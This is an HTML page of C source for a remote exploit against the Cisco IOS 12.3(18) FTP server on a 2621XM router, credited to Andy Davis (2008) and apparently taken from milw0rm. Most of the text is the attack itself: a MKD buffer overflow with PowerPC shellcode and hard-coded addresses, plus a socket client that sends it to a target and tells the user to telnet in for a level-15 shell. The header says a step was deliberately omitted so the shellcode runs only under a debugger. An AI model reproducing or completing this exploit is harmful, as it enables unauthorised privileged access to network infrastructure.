<html><head><title>Cisco IOS 12.3(18) FTP Server Remote Exploit (attached to gdb)</title></head><pre>/*

 Cisco IOS FTP server remote exploit by Andy Davis 2008               
                                                                      
 Cisco Advisory ID: cisco-sa-20070509-iosftp - May 2007               
                                                                      
 Specific hard-coded addresses for IOS 12.3(18) on a 2621XM router    
                                                                      
 Removes the requirement to authenticate and escalates to level 15    
                                                                      
 *********************************************************************
 To protect the innocent a critical step has been omitted, which means
 the shellcode will only execute when the router is attached to gdb.  
 I'm sure the PowerPC shellcoders out there will work it out...       
 *********************************************************************
                                                                      
 Thanks to Gyan Chawdhary and Varun Uppal for all the hours they spent
 on the original IOS security research                                
                                                                      
 iosftpexploit &lt;at&gt; googlemail 'dot' com                              

*/

#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define PORT 21

int main(int argc, char **argv)
{
unsigned char sendbuf[] =

&quot;MKD &quot;

/* .equ vty_info, 0x8182da60    # pointer to VTY info */
/* .equ terminate, 0x80e4086c   # kill a process */

&quot;\x3c\x80\x81\x83&quot;      /* lis     4,vty_info@ha */
&quot;\x38\x84\xda\x60&quot;      /* la      4,vty_info@l(4) */
&quot;\x7d\x08\x42\x78&quot;      /* xor     8,8,8 */
&quot;\x7c\xe4\x40\x2e&quot;      /* lwzx    7,4,8 */
&quot;\x91\x07\x01\x74&quot;      /* stw     8,372(7) */
&quot;\x39\x08\xff\xff&quot;      /* subi    8,8,1 */
&quot;\x38\xe7\x09\x1a&quot;      /* addi    7,7,233 */
&quot;\x91\x07\x04\xca&quot;      /* stw     8,1226(7) */
&quot;\x7d\x03\x43\x78&quot;      /* mr      3,8 */
&quot;\x3c\x80\x80\xe4&quot;      /* lis     4,terminate@ha */
&quot;\x38\x84\x08\x6c&quot;      /* la      4,terminate@l(4) */
&quot;\x7c\x89\x03\xa6&quot;      /* mtctr   4 */
&quot;\x4e\x80\x04\x20&quot;      /* bctr    */

/* exists cleanly without adversely affecting the FTP server */

&quot;\x61\x61\x61\x61&quot;      /* padding */
&quot;\x61\x61\x61\x61&quot;      /* padding */
&quot;\x61\x61\x61\x61&quot;      /* padding */
&quot;\x61\x61\x61\x61&quot;      /* padding */
&quot;\x61\x61\x61\x61&quot;      /* padding */
&quot;\x61\x61\x61\x61&quot;      /* padding */

&quot;\x80\x06\x23\xB8&quot;      /* return address */
&quot;\x0d\x0a&quot;;

/* trampoline code */
/* when the overflow occurs r26+0x14 points to the shellcode */
/*
0x800623B8      lwz     26, 20(26)
0x800623BC      mtctr   26
0x800623C0      mr      3, 27
0x800623C4      bctrl
*/

unsigned char recvbuf[256];
struct sockaddr_in servaddr;
int s;

if (argc != 2)
        {
        printf (&quot;\nCisco IOS FTP server remote exploit by Andy Davis 2008\n&quot;);

        printf (&quot;\nUsage: %s &lt;target IP address&gt;\n&quot;,argv[0]);
        exit(-1);
        }

servaddr.sin_family = AF_INET;
servaddr.sin_addr.s_addr = inet_addr(argv[1]);
servaddr.sin_port = htons(PORT);

s = socket(AF_INET, SOCK_STREAM, 0);
connect (s, (struct sockaddr *) &amp;servaddr, sizeof(servaddr));
printf (&quot;\nCisco IOS FTP server remote exploit by Andy Davis 2008\n&quot;);
printf (&quot;Specific offsets for IOS 12.3(18) on a 2621XM router\n\n&quot;);
printf (&quot;Sending exploit...\n\n&quot;);

if (send(s, sendbuf, sizeof(sendbuf)-1, 0) == 0)
        {
        printf(&quot;Error sending packet...quitting\n\n&quot;);
        exit (1);
        }
recv (s, recvbuf, sizeof(recvbuf)-1,0);
printf (&quot;Now telnet to the router for a shell...\n\n&quot;);
}

// milw0rm.com [2008-07-29]</pre></html>